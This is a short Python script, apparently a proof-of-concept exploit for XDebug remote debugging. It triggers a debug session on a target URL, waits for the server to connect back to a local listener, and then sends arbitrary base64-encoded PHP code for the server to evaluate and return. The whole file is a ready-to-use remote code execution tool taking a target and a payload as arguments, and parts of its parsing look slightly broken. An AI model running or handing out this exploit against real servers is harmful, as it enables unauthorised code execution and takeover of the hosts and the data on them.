import re
import time
import requests
import argparse
import socket
import base64
from concurrent.futures import ThreadPoolExecutor


pool = ThreadPoolExecutor(1)
session = requests.session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}

def recv_xml(sock):
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        eop = data.find('\x00')
        length = data[:eop]
        data = data[eop+1:]

        eop = data.find('\x00')
        if eop < 0:
            continue

        content = data[:eop]
        break
    
    return content


def trigger(url):
    time.sleep(2)
    session.get(url + '?XDEBUG_SESSION_START=phpstorm')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('-l', '--listen', default=9000, help='local port')
    args = parser.parse_args()
    
    ip_port = ('0.0.0.0', args.listen)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    pool.submit(trigger, args.target)
    conn, addr = sk.accept()
    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

    data = recv_xml(conn)
    g = re.search(rb'<\!\[CDATA\[([a-z0-9\./\+]+)\]>', data, re.I)
    if not g:
        print('[-] No result...')

    data = g.group(1)
    print('[+] Result: ' + base64.b64decode(data).decode())